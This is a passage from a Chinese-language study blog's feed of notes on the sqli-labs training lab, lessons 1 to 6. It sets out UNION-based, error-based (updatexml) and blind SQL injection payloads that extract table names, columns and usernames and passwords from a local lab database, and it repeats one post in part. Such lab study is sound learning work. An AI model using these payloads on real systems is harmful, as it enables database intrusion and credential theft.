admi<br>[+] 获取第 <span class="hljs-number">5</span> 个字符...<br>[+] 当前结果: admin<br>[+] 获取第 <span class="hljs-number">6</span> 个字符...<br>[+] 当前结果: admin4<br>[+] 数据[<span class="hljs-number">13</span>]: admin4<br><br></code></pre></td></tr></table></figure><h3 id="bp盲注爆破"><a href="#bp盲注爆破" class="headerlink" title="bp盲注爆破"></a>bp盲注爆破</h3><p>csdn上看到可以直接不用写脚本直接用bp看返回长度来爆破的<br>看来也可以不用if函数来构造payload</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;and</span> substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) =<span class="hljs-string">&#x27;s&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>能达到同样效果</p><p>bp爆破的话payload设置的前后和循序有点难搞，但是原理知道了可以一次一次慢慢试；</p><h2 id="xml报错注入"><a href="#xml报错注入" class="headerlink" title="xml报错注入"></a>xml报错注入</h2><p>前提是在有sql报错信息输出的前提下（存在print_r(mysql_error())函数）</p><p>在高版本MySQL（5.1）中添加了对xml文档进行查询和修改的函数</p><p>update函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">UPDATEXML</span><span class="hljs-params">(xml_target, xpath_expr, new_xml)</span></span><br><br>xml_target：要更新的XML文档。<br>xpath_expr：XPath表达式，用于定位需要更新的节点。<br>new_xml：新的XML片段或值，用于替换目标节点的值。<br></code></pre></td></tr></table></figure><p>extractvalue函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">EXTRACTVALUE</span><span class="hljs-params">(xml_target, xpath_expr)</span></span><br></code></pre></td></tr></table></figure><p>原理是用xpath的非法字符报错<br>KIMI：</p><blockquote><p>updatexml()和extractvalue()函数在处理XML数据时，会使用XPath表达式来定位或提取节点。如果XPath表达式不符合语法规范，MySQL会返回错误信息。攻击者可以利用这一特性，通过拼接恶意的XPath表达式，使数据库报错，并在错误信息中泄露敏感数据。  </p></blockquote><p>流程：  </p><p>1.判断闭合点<br>2.判断是否存在xml报错注入：<br>使用<strong>updatexml</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><span class="hljs-number">0x7e</span> 是 ~ 的<span class="hljs-number">16</span>进制表示，用来进行绕过，字符串替换成十六进制数有一定的绕过作用<br></code></pre></td></tr></table></figure><p>成功回显</p><blockquote><p>XPATH syntax error: ‘~’  </p></blockquote><p>说明存在报错注入</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0</span>x7e, (<span class="hljs-keyword">SELECT</span> database()), <span class="hljs-number">0</span>x7e), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><blockquote><p>爆库名</p></blockquote><p><em><strong>note</strong></em> </p><p>concat和group_concat有什么区别,问了kimi，<br><em><strong>我总结就是concat用来拼接字符串，group_concat用来拼接表中的内容</strong></em></p><p>然后就是走注入流程  </p><p>爆表名</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name)<span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()),0x7e),1)--+<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘  </p></blockquote><p>爆字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;and updatexml(1,concat(0x7e,(select group_concat(column_name)<span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),0x7e),1)--+<br><br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p></blockquote><p>爆表</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">32768</span>/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select%<span class="hljs-number">20</span>group_concat(id,username,password)from%<span class="hljs-number">20</span>users),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><blockquote><p>XPATH syntax error: ‘~1DumbDumb,2AngelinaI-kill-you,3’  </p></blockquote><p>发现回显不完全，听说xpath报错有长度限制，改为：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password)<span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>发现limit的值改变了依然没结果，看了眼csdn，发现group_concat要改为concat，<br>问了kimi，limit是限制输出的行在哪，如(0,1)就会限制为从第一行开始提取一列，但是用group_concat，会将一整个表整合为一行，限制就没用了。</p><p>最后payload改为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>成功，只要一条条爆出users表中内容就行了。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># sql-labs less6</span><br><br>和less5原理一样<br></code></pre></td></tr></table></figure><p>select * from users where id&#x3D;”$get_id”</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">闭合payload改为<br></code></pre></td></tr></table></figure><p>?id&#x3D;1”</p><pre><code class="hljs">即可</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>blog备注</title>
    <link href="/2025/02/27/blog%E5%A4%87%E6%B3%A8/"/>
    <url>/2025/02/27/blog%E5%A4%87%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="blog环境备注"><a href="#blog环境备注" class="headerlink" title="blog环境备注"></a>blog环境备注</h1><p>HEXO框架<br>Fiuld主题<br>GitHubio托管</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>学习环境</title>
    <link href="/2025/02/27/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83/"/>
    <url>/2025/02/27/%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="记录一下sql学习环境的布置"><a href="#记录一下sql学习环境的布置" class="headerlink" title="记录一下sql学习环境的布置"></a>记录一下sql学习环境的布置</h1><p>docker 下部署:  </p><p>sql-labs<br>xss-challenge  </p><p>搭配  </p><p><a href="https://blog.csdn.net/2301_76913435/article/details/145601627">2025 sqli-labs通关流程 手把手教 详细讲解 by <strong>不会码字的笨蛋奶妈</strong></a>  </p><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解 by <strong>糊涂是福yyyy</strong></a>  </p><p>一起食用</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>note-02</title>
    <link href="/2025/02/27/note-02/"/>
    <url>/2025/02/27/note-02/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-less-3"><a href="#sql-labs-less-3" class="headerlink" title="sql-labs less-3"></a>sql-labs less-3</h1><p>传入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;<br></code></pre></td></tr></table></figure><p>回显</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’-1’’) LIMIT 0,1’ at line 1</p></blockquote><p>根据csdn和题目的提示，推测sql查询语句  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>)<br></code></pre></td></tr></table></figure><p>所以当传入payload为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>整段sql查询语句为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-variable">$id</span>=(<span class="hljs-string">&#x27;1&#x27;</span>)--+)<br></code></pre></td></tr></table></figure><p>如此一来成功闭合sql查询，后面就按流程走ok了</p><h2 id="新知识点"><a href="#新知识点" class="headerlink" title="新知识点"></a>新知识点</h2><p><em><strong>并和括号</strong></em>  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="sql-labs-less-4"><a href="#sql-labs-less-4" class="headerlink" title="sql-labs less-4"></a>sql-labs less-4</h1><p>一开始也不知道有用双引号来构造的，然后还是看了csdn😅</p><p>传入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;)<br></code></pre></td></tr></table></figure><p>回显：</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“) LIMIT 0,1’ at line 1 </p></blockquote><p>推测后台sql语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=(<span class="hljs-string">&quot;<span class="hljs-variable">$id</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>后面的paylaod：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,2,3 --+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,database(),3 --+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,database(),group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,database(),group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&quot;) union select 1,database(),group_concat(id,username,password) <span class="hljs-keyword">from</span> users--+<br></code></pre></td></tr></table></figure><h2 id="新知识点-1"><a href="#新知识点-1" class="headerlink" title="新知识点"></a>新知识点</h2><p><em><strong>双引号</strong></em>  </p><p>用双引号来 “ 来闭合语句</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-01</title>
    <link href="/2025/02/26/note-01/"/>
    <url>/2025/02/26/note-01/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-学习笔记"><a href="#sql-labs-学习笔记" class="headerlink" title="sql-labs 学习笔记"></a>sql-labs 学习笔记</h1><h2 id="sql-labs-less-1"><a href="#sql-labs-less-1" class="headerlink" title="sql-labs less-1"></a>sql-labs less-1</h2><p>字符型<br>sql注入后端代码(编的)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure><p><em><strong>在url中直接使用’#’会被url解析，导致传入服务器的不为’#’所以使用‘- - +’</strong></em></p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<br><span class="hljs-comment">//看能否判断sql注入类型</span><br></code></pre></td></tr></table></figure><p>拼入sql查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>回显：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p><p>KIMI：  </p><blockquote><p>这个错误信息表明你的SQL语句中存在语法问题，具体问题出现在’1’附近，可能是因为SQL语句的拼接方式不正确，或者某些部分的格式不符合MySQL的语法规则。<br>从错误信息来看，问题可能出在以下几个方面：</p></blockquote><blockquote><p>单引号的使用：错误信息中提到’1’，这表明SQL语句中可能有多余的单引号，或者单引号的使用方式不正确。</p></blockquote><blockquote><p>LIMIT子句的格式：LIMIT 0,1是正确的语法，但错误信息表明它可能与前面的语句拼接不当。</p></blockquote><blockquote><p>注入攻击：如果’1’是用户输入的一部分，那么这可能是SQL注入攻击的迹象。</p></blockquote><p><strong>LIMIT 0,1 是 SQL 语句中用于限制查询结果数量的子句，特别是在 MySQL 数据库中。<br>它的作用是从查询结果中提取指定范围的记录。具体来说，LIMIT 0,1 的含义如下：</strong>  </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语法格式：<br>LIMIT <span class="hljs-built_in">offset</span>, <span class="hljs-built_in">count</span><br><span class="hljs-built_in">offset</span>：表示从结果集的第几条记录开始提取（从 <span class="hljs-number">0</span> 开始计数）。<br><span class="hljs-built_in">count</span>：表示提取的记录数量。<br></code></pre></td></tr></table></figure><p>回显有数字判断为字符型</p><p><em><strong>记得用‘-1’来使得前面对‘-1’的查询出现null的结果免得使用‘1’查询出的结果会将后面的查询覆盖，由刚才的：</strong></em>  </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-number">0</span>：表示从结果集的第一条记录开始（即跳过 <span class="hljs-number">0</span> 条记录）。<br><span class="hljs-number">1</span>：表示只提取一条记录。<br>因此，<span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> 的作用是从查询结果中提取第一条记录。<br></code></pre></td></tr></table></figure><p>测试回显行列</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;order</span> by <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><br>?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>查询当前库</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>后面的paylaod</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(id,username,password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br></code></pre></td></tr></table></figure><p>在博客园和csdn有很多详细解释，只记下自己不明白去查询的点以防以后忘记</p><h3 id="我的新知识点"><a href="#我的新知识点" class="headerlink" title="我的新知识点"></a>我的新知识点</h3><p><strong>group_concat &#x2F;&#x2F;将查询到的表的数据结果拼接起来</strong></p><p><strong>union select &#x2F;&#x2F;联合查询，能将同时查询 1,2,3 个</strong></p><p><strong>information_schema &#x2F;&#x2F;在SQL中，INFORMATION_SCHEMA 是一个特殊的数据库，它存储了数据库管理系统（DBMS）的元数据信息。这些元数据包括数据库的结构、表的信息、列的定义、用户权限、存储过程等。</strong></p><p>INFORMATION_SCHEMA 提供了一种标准化的方式来访问数据库的元数据信息。它类似于一个“数据库的数据库”，帮助用户了解数据库的内部结构和配置。通过查询 INFORMATION_SCHEMA 中的表，用户可以获取以下信息：  </p><p>数据库中有哪些表（INFORMATION_SCHEMA.TABLES）。  </p><p>每个表有哪些列（INFORMATION_SCHEMA.COLUMNS）。</p><p>数据库的用户权限（INFORMATION_SCHEMA.USER_PRIVILEGES）。</p><p>数据库的字符集和校对规则（INFORMATION_SCHEMA.CHARACTER_SETS）。</p><p>存储过程和函数的定义（INFORMATION_SCHEMA.ROUTINES）。</p><p>数据库的表分区信息（INFORMATION_SCHEMA.PARTITIONS）。</p><p>数据库的外键约束信息（INFORMATION_SCHEMA.KEY_COLUMN_USAGE）。</p><p><em><strong>我看我目前用到的是下面：</strong></em></p><p>  (1) INFORMATION_SCHEMA.TABLES<br>用途：列出数据库中所有表的信息。<br>字段：<br>table_schema：表所属的数据库名称。<br>table_name：表的名称。<br>table_type：表的类型（如 BASE TABLE 或 VIEW）。<br>engine：表的存储引擎（如 InnoDB 或 MyISAM）。</p><p>(2) INFORMATION_SCHEMA.COLUMNS<br>用途：列出表中所有列的详细信息。<br>字段：<br>table_schema：表所属的数据库名称。<br>table_name：表的名称。<br>column_name：列的名称。<br>data_type：列的数据类型<br>character_maximum_length：列的最大长度。</p><p><em><strong>搭配 where 来使用</strong></em></p><p>回顾刚才的payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">?id=-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><h3 id="新知识点"><a href="#新知识点" class="headerlink" title="新知识点"></a>新知识点</h3><p><em><strong>数字型注入的sql语句</strong></em></p><p>后端代码 例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;selcet * from users where id=<span class="hljs-variable">$get_id</span>&quot;</span><br><br></code></pre></td></tr></table></figure><p>与字符型的区别是将用户输入内容：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$get</span>_id</span><br></code></pre></td></tr></table></figure><p>直接拼接到sql语句中。  </p><p>对比字符型sql语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure><p>所以不需要使用 “ ‘ “ 来构建新的查询，也不需要 ‘#’ 或者 ‘–+’来将后面的语句注释掉，如果带密码则需要注释吧  </p><pre><code class="hljs">?id=1 order by 3?id=-1 union select 1,2,3?id=-1 union select 1,database(),version()?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;?id=-1 union select 1,2,group_concat(username ,id , password) from users</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-01</title>
    <link href="/2025/02/26/notepad/"/>
    <url>/2025/02/26/notepad/</url>
    
    <content type="html"><![CDATA[<h1 id="sql-labs-学习笔记"><a href="#sql-labs-学习笔记" class="headerlink" title="sql-labs 学习笔记"></a>sql-labs 学习笔记</h1><h2 id="sql-labs-less-1"><a href="#sql-labs-less-1" class="headerlink" title="sql-labs less-1"></a>sql-labs less-1</h2><p>字符型<br>sql注入后端代码(编的)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure><p><em><strong>在url中直接使用’#’会被url解析，导致传入服务器的不为’#’所以使用‘- - +’</strong></em></p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<br><span class="hljs-comment">//看能否判断sql注入类型</span><br></code></pre></td></tr></table></figure><p>拼入sql查询</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>回显：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p><p>KIMI：  </p><blockquote><p>这个错误信息表明你的SQL语句中存在语法问题，具体问题出现在’1’附近，可能是因为SQL语句的拼接方式不正确，或者某些部分的格式不符合MySQL的语法规则。<br>从错误信息来看，问题可能出在以下几个方面：</p></blockquote><blockquote><p>单引号的使用：错误信息中提到’1’，这表明SQL语句中可能有多余的单引号，或者单引号的使用方式不正确。</p></blockquote><blockquote><p>LIMIT子句的格式：LIMIT 0,1是正确的语法，但错误信息表明它可能与前面的语句拼接不当。</p></blockquote><blockquote><p>注入攻击：如果’1’是用户输入的一部分，那么这可能是SQL注入攻击的迹象。</p></blockquote><p><strong>LIMIT 0,1 是 SQL 语句中用于限制查询结果数量的子句，特别是在 MySQL 数据库中。<br>它的作用是从查询结果中提取指定范围的记录。具体来说，LIMIT 0,1 的含义如下：</strong>  </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语法格式：<br>LIMIT <span class="hljs-built_in">offset</span>, <span class="hljs-built_in">count</span><br><span class="hljs-built_in">offset</span>：表示从结果集的第几条记录开始提取（从 <span class="hljs-number">0</span> 开始计数）。<br><span class="hljs-built_in">count</span>：表示提取的记录数量。<br></code></pre></td></tr></table></figure><p>回显有数字判断为字符型</p><p><em><strong>记得用‘-1’来使得前面对‘-1’的查询出现null的结果免得使用‘1’查询出的结果会将后面的查询覆盖，由刚才的：</strong></em>  </p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-number">0</span>：表示从结果集的第一条记录开始（即跳过 <span class="hljs-number">0</span> 条记录）。<br><span class="hljs-number">1</span>：表示只提取一条记录。<br>因此，<span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> 的作用是从查询结果中提取第一条记录。<br></code></pre></td></tr></table></figure><p>测试回显行列</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;order</span> by <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><br>?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>查询当前库</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>后面的paylaod</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(id,username,password) 